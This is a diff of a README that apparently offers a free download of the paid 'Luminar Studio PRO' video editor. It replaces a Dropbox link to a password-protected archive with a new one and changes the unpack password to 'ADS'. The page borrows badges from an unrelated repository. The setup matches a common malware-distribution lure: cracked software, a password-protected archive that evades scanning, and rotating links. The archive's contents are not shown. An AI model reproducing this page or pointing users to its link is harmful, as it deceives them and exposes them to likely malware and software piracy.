@@ -1,5 +1,5 @@
 <h1 align="center">Luminar Studio PRO</h1>
-<h4 align="center">version 4.2.5</h4>
+<h4 align="center">Password to archive: ADS</h4>
 <h2 align="center">
 
 </h2>
@@ -19,8 +19,8 @@
 <img src="https://img.shields.io/github/issues/silent-lad/VueSolitaire.svg">
 
 
-<h1 align="center"><a  href="https://www.dropbox.com/s/3nn0w8zq64iphsm/MediaArchive.zip?dl=1">DOWNLOAD</a></h1>
-<h4 align="center">Download the program, use the password: premium. To unpack the archive and install the video editor on your computer </h4>
+<h1 align="center"><a  href="https://www.dropbox.com/s/jg8m2lgos0y7cwr/MediaArchive.zip?dl=1">DOWNLOAD</a></h1>
+<h4 align="center">Download the program, use the password: ADS To unpack the archive and install the video editor on your computer </h4>
 <p align="center">
   
 ## Description
